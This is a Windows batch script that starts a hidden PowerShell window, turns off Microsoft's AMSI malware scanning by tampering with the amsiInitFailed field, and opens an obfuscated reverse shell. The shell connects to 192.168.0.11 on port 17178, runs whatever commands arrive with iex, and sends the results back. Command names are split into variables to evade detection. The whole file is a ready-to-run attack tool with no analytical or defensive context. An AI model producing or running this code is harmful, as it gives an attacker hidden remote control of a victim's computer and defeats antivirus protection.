@echo off
powershell -WindowStyle Hidden -Command "
function Invoke-ObfuscatedShell {
    # Using IPv4 address from your ipconfig output
    $a = '192.168.0.11' 
    $p = 17178
    $c = 'System.Net.Sockets.TCPClient'
    $s = 'GetStream'
    $r = 'Read'
    $e = 'System.Text.ASCIIEncoding'
    $x = 'iex'
    $y = 'Out-String'
    $z = 'pwd'
    $k = 'Path'
    $m = 'Write'
    $n = 'Flush'
    $o = 'Close'
    
    try {
        $client = New-Object $c($a, $p)
        $stream = $client.$s()
        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
        
        while (($i = $stream.$r($bytes, 0, $bytes.Length)) -ne 0) {
            $data = (New-Object -TypeName $e).GetString($bytes, 0, $i)
            $sendback = (& $x $data 2>&1 | & $y)
            $sendback2 = $sendback + 'PS ' + (& $z).$k + '> '
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.$m($sendbyte, 0, $sendbyte.Length)
            $stream.$n()
        }
    } catch {
        # Optional: Add error handling to see why it failed
        Write-Host 'Connection failed. Check IP address and port.'
    } finally {
        if ($client) { $client.$o() }
    }
}

# This line bypasses AMSI, use with caution
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').GetValue($null), 0x4D5A9000)
Invoke-ObfuscatedShell"
